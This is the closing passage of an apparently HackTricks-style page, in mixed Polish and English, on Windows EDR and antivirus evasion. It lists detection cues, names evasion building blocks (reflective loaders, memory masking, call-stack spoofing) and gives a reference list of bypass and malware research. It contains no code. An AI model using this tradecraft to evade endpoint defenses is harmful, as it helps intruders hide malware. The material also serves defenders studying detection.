- Stack anomalies: adresy powrotu nie należące do załadowanych obrazów; nagłe przejścia do non‑image PIC; niespójne pochodzenie RtlUserThreadStart.
- Loader telemetry: zapisy w procesie do IAT, wczesna aktywność DllMain modyfikująca import thunks, nieoczekiwane RX regions tworzone podczas ładowania.
- Image‑load evasion: jeśli hookujesz LoadLibrary*, monitoruj podejrzane ładowania automation/clr assemblies skorelowane z memory masking events.

Powiązane elementy budulcowe i przykłady
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## Referencje

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
